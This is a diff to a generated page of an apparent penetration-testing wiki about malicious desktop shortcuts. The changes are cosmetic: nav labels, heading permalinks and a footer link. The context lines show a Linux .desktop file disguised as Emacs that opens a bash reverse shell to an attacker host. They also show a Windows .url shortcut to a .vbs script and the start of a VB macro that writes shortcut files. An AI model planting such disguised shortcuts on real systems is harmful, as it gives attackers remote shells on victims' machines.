@@ -1175,8 +1175,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../" title="Home" class="md-nav__link">
-      Home
+    <a href="../../../" title="About" class="md-nav__link">
+      About
     </a>
   </li>
 
@@ -2550,8 +2550,8 @@
                   <a href="https://github.com/DirWalk/site/edit/master/docs/wiki/Penetration Testing/Techniques/Malicious Desktop Shortcuts.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="malicious-desktop-shortcuts">Malicious Desktop Shortcuts</h1>
-<h2 id="linux">Linux</h2>
+                <h1 id="malicious-desktop-shortcuts">Malicious Desktop Shortcuts<a class="headerlink" href="#malicious-desktop-shortcuts" title="Permanent link">&para;</a></h1>
+<h2 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span><code>[Desktop Entry]
 Name=Emacs
 Exec=/bin/bash -i &gt;&amp; /dev/tcp/[RHOST]/[RPORT] 0&gt;&amp;1
@@ -2561,14 +2561,14 @@ Type=Application
 </code></pre></div>
 
 
-<h2 id="windows">Windows</h2>
+<h2 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span><code>[InternetShortcut]
 URL=file:///C:\Users\user\AppData\Roaming\forfiles\regsvr32.vbs[InternetShortcut]
 URL=file:///C:\Users\user\AppData\Roaming\forfiles\regsvr32.vbs
 </code></pre></div>
 
 
-<h2 id="excel-sheet-macro-mailto">Excel Sheet Macro <code>mailto:</code></h2>
+<h2 id="excel-sheet-macro-mailto">Excel Sheet Macro <code>mailto:</code><a class="headerlink" href="#excel-sheet-macro-mailto" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span><code>Private Sub Form_Load()
 Open &quot;C:\mail.url&quot; For Output As #1
 Print #1, &quot;[InternetShortcut]&quot;
@@ -2632,8 +2632,6 @@ End Sub
       <a href="https://twitter.com/DirWalk" target="_blank" rel="noopener" title="twitter" class="md-footer-social__link fa fa-twitter"></a>
     
       <a href="mailto:dirwalk@pm.me" target="_blank" rel="noopener" title="envelope-o" class="md-footer-social__link fa fa-envelope-o"></a>
-    
-      <a href="https://wiki.dirwalk.com" target="_blank" rel="noopener" title="book" class="md-footer-social__link fa fa-book"></a>
     
   </div>
 </div>
